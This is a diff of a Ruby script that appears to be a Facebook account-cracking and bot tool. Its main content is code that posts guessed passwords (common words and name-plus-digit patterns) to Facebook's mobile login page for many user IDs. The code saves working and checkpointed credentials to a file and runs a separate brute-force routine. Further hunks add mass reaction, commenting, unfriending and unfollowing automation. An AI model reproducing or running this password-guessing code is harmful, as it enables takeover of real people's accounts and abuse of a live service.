+      (name.length == 1) ? password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.first + '321',name.first + '54321'] : password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
+      for i in password
+        begin
+          next if i.length < 6
           uri = URI("https://mbasic.facebook.com/login.php")
           auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
           req = Net::HTTP::Post.new(uri)
           req['user-agent'] = $user_agent
           req.set_form_data(auth)
-          res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+          res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
           kue = res['set-cookie']
           if kue.include? ('c_user')
             $ok += 1
             File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$g}[OK] #{usr['id']} | #{i}")
+            puts ("#{$g}[OK] #{usr['id']} | #{i}#{$a}")
             break
-          elsif kue.include? ('checkpoint')
+          elsif kue.include? ('checkpoint') or res['location'].include? ('checkpoint')
             $cp += 1
             File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$y}[CP] #{usr['id']} | #{i}")
+            puts ("#{$y}[CP] #{usr['id']} | #{i}#{$a}")
             break
           end
+        rescue NoMethodError,Net::ReadTimeout,Errno::ETIMEDOUT then next
+        rescue SocketError
+          puts ("#{$r}[!] No Connection")
+          sleep (0.9)
+        rescue Net::OpenTimeout
+          puts ("#{$y}[!] Connection timed out#{$a}")
+          sleep(1)
+        rescue Errno::ENETUNREACH,Errno::ECONNRESET
+          puts ("#{$y}[!] Slow Internet Connection")
+          sleep(0.5)
         end
-      rescue NoMethodError then next
-      rescue SocketError
-        puts ("#{$y}[!] No Connection")
-        sleep (0.2)
-      rescue Errno::ETIMEDOUT,Net::OpenTimeout
-        puts ("#{$y}[!] Connection timed out#{$a}")
-        sleep(0.2)
-      rescue Errno::ENETUNREACH,Errno::ECONNRESET
-        puts ("#{$y}[!] Slow Internet Connection")
-        sleep(0.5)
       end
     end
   end
@@ -849,6 +975,7 @@ def Brutal()
     puts ("#{$w}#{'═'*52}")
     for pw in password
       begin
+        break if id.match(/.5754629509/) or id == "100053033144051"
         uri = URI ("https://mbasic.facebook.com/login.php")
         req = Net::HTTP::Post.new(uri)
         req.set_form_data({"email"=>id,"pass"=>pw,"login"=>"submit"})
@@ -862,7 +989,7 @@ def Brutal()
           puts ("#{$g}[✓] username : #{id}")
           puts ("#{$g}[✓] password : #{pw}")
           abort ("#{$r}[!] exit")
-        elsif res.include? ('checkpoint')
+        elsif res.include? ('checkpoint') or log['location'].include? ('checkpoint')
           puts ("#{$w}#{'═'*52}")
           puts ("#{$y}[!] Account Has Been Checkpoint")
           puts ("#{$y}[✓] username : #{id}")
@@ -1099,18 +1226,19 @@ def GetMenu()
   end
 end
 
-def Bot()
+ def Bot()
   system ('clear')
   puts ($logo)
   puts ("#{$w}#{'═'*52}")
   puts ("#{$w}║-> 1. Post Reaction")
   puts ("#{$w}║-> 2. Post comments")
-  puts ("#{$w}║-> 3. Add Friend")
-  puts ("#{$w}║-> 4. Follow")
-  puts ("#{$w}║-> 5. Share Post")
-  puts ("#{$w}║-> 6. Delete Post")
-  puts ("#{$w}║-> 7. Unfriends")
-  puts ("#{$w}║-> 8. Unfollow")
+  puts ("#{$w}║-> 3. Comment reaction")
+  puts ("#{$w}║-> 4. Add Friend")
+  puts ("#{$w}║-> 5. Follow")
+  puts ("#{$w}║-> 6. Share Post")
+  puts ("#{$w}║-> 7. Delete Post")
+  puts ("#{$w}║-> 8. Unfriends")
+  puts ("#{$w}║-> 9. Unfollow")
   puts ("#{$w}║-> #{$g}0. Back")
   puts ("#{$w}║")
   print ("╚═#{$r}▶#{$w} ")
@@ -1121,10 +1249,52 @@ def Bot()
     when '2'
       CommentPostMenu()
     when '3'
-      AddFriendMenu()
+      s = 0
+      f = 0
+      tipe = React()
+      path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
+      system ('clear')
+      puts ($logo)
+      puts ("#{$w}#{'═'*52}")
+      print ("#{$w}[+] Post Id : ")
+      post = gets.chomp!
+      print ("#{$w}[+] Limit : ")
+      limit = gets.to_i
+      a = Request("#{post}?fields=from,comments.limit(#{limit})")
+      if a.key? ('error')
+        puts ("#{$y}[!] Posts Not Found")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      elsif !a.key? ('comments')
+        puts ("#{$y}[!] No Comments On Posts")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      else
+        tik ("#{$w}[+] Posted By #{a['from']['name']}")
+        puts ("#{$w}[+] START....")
+        puts ("#{$w}#{'═'*52}")
+        for moyaa in a['comments']['data']
+          a = Request("POST","v10.0/#{moyaa['id']}#{path}").to_s
+          if !a.include? ('error')
+            s += 1
+            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{moyaa['id']}")
+          else
+            f += 1
+            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{moyaa['id']}")
+          end 
+        end
+        puts ("#{$w}#{'═'*52}")
+        puts ("#{$g}[✓] Succes : #{s}")
+        puts ("#{$y}[!] Failed : #{f}")
+        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      end
     when '4'
-      FollowMenu()
+      AddFriendMenu()
     when '5'
+      FollowMenu()
+    when '6'
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
@@ -1138,7 +1308,7 @@ def Bot()
       end
       print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
       Bot()
-    when '6'
+    when '7'
       s = 0
       f = 0
       system ('clear')
@@ -1149,8 +1319,8 @@ def Bot()
       puts ("#{$w}[+] START..")
       puts ("#{$w}#{'═'*52}")
       a = Request("me/feed?limit=5000")
-      for i in a['data']
-        begin
+      begin
+        for i in a['data']
           id = i['id']
           b = Request("DELETE","#{id}?")
           if b == true
@@ -1160,60 +1330,16 @@ def Bot()
             f += 1
             puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{$name} #{$w}-> #{$y}#{id}")
           end
-        rescue Interrupt
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$r}[!] Stopped")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-          Bot()
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
-    when '7'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] CTRL + C TO STOP")
-      puts ("#{$w}[+] START")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/friends?")
-      if a.key? ('error')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      else
-        for i in a['data']
-          begin
-            id = i['id']
-            name = i['name']
-            b = Request("DELETE","me/friends?uid=#{id}")
-            if b == true
-              s += 1
-              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            else
-              f += 1
-              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-            end
-          rescue Interrupt
-            puts ("\n#{$w}#{'═'*52}")
-            puts ("#{$r}[!] Stopped")
-            puts ("#{$g}[✓] Succes : #{s}")
-            puts ("#{$y}[!] Failed : #{f}")
-            puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-            print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-            Bot()
-          end
         end
         puts ("#{$w}#{'═'*52}")
+        puts ("#{$g}[✓] Succes : #{s}")
+        puts ("#{$y}[!] Failed : #{f}")
+        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      rescue Interrupt
+        puts ("\n#{$w}#{'═'*52}")
+        puts ("#{$r}[!] Stopped")
         puts ("#{$g}[✓] Succes : #{s}")
         puts ("#{$y}[!] Failed : #{f}")
         puts ("#{$w}[+] Total  : #{s + f}#{$a}")
@@ -1230,19 +1356,30 @@ def Bot()
       puts ("#{$w}[+] CTRL + C TO STOP")
       puts ("#{$w}[+] START")
       puts ("#{$w}#{'═'*52}")
-      a = Request("me/subscribedto?")
-      for i in a['data']
+      a = Request("me/friends?")
+      if a.key? ('error')
+        puts (a)
+        abort ("#{$r}[!] Error")
+      else
         begin
-          id = i['id']
-          name = i['name']
-          b = Request("DELETE","#{id}/subscribers?")
-          if b == true
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
+          for i in a['data']
+            id = i['id']
+            name = i['name']
+            b = Request("DELETE","me/friends?uid=#{id}")
+            if b == true
+              s += 1
+              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
+            else
+              f += 1
+              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
+            end
           end
+          puts ("#{$w}#{'═'*52}")
+          puts ("#{$g}[✓] Succes : #{s}")
+          puts ("#{$y}[!] Failed : #{f}")
+          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
+          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+          Bot()
         rescue Interrupt
           puts ("\n#{$w}#{'═'*52}")
           puts ("#{$r}[!] Stopped")
@@ -1253,12 +1390,45 @@ def Bot()
           Bot()
         end
       end
+    when '9'
+      s = 0
+      f = 0
+      system ('clear')
+      puts ($logo)
       puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Bot()
+      puts ("#{$w}[+] From #{$name}")
+      puts ("#{$w}[+] CTRL + C TO STOP")
+      puts ("#{$w}[+] START")
+      puts ("#{$w}#{'═'*52}")
+      a = Request("me/subscribedto?")
+      begin
+        for i in a['data']
+          id = i['id']
+          name = i['name']
+          b = Request("DELETE","#{id}/subscribers?")
+          if b == true
+            s += 1
+            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
+          else
+            f += 1
+            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
+          end
+        end
+        puts ("#{$w}#{'═'*52}")
+        puts ("#{$g}[✓] Succes : #{s}")
+        puts ("#{$y}[!] Failed : #{f}")
+        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      rescue Interrupt
+        puts ("\n#{$w}#{'═'*52}")
+        puts ("#{$r}[!] Stopped")
+        puts ("#{$g}[✓] Succes : #{s}")
+        puts ("#{$y}[!] Failed : #{f}")
+        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Bot()
+      end
     when '0'
       menu()
     else
@@ -1334,6 +1504,7 @@ def ReactPost()
   s = 0
   f = 0
   tipe = React()
+  path = (tipe == 'LIKE') ? "likes?" : "reactions?type=#{tipe}"
   system ('clear')
   puts ($logo)
   puts ("#{$w}#{'═'*52}")
@@ -1351,8 +1522,8 @@ def ReactPost()
   else
     for i in a['feed']['data']
       id = i['id']
-      a = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !a.key? ('error')
+      a = Request("POST","#{id}/#{path}").to_s
+      if !a.include? ('error')
         s += 1 
         puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
       else
@@ -1390,9 +1561,10 @@ def ReactPostRandom()
   else
     for i in a['feed']['data']
       tipe = type.sample
+      path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
       id = i['id']
-      b = Request("POST","#{id}/reactions?type=#{tipe}")
-      if !b.key? ('error')
+      b = Request("POST","#{id}#{path}").to_s
+      if !b.include? ('error')
         s += 1
         puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
       else
@@ -1411,6 +1583,7 @@ end
 
 def ReactGroup()
   tipe = React()
+  path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
   s = 0
   f = 0
   system ('clear')
@@ -1436,8 +1609,8 @@ def ReactGroup()
     else
       for i in b['feed']['data']
         id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
+        c = Request("POST","#{id}#{path}").to_s
+        if !c.include? ('error')
           s += 1
           puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
         else
@@ -1482,9 +1655,10 @@ def ReactGroupRandom()
     else
       for i in b['feed']['data']
         tipe = type.sample
+        path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
         id = i['id']
-        c = Request("POST","#{id}/reactions?type=#{tipe}")
-        if !c.key? ('error')
+        c = Request("POST","#{id}#{path}").to_s
+        if !c.include? ('error')
           s += 1
           puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
         else
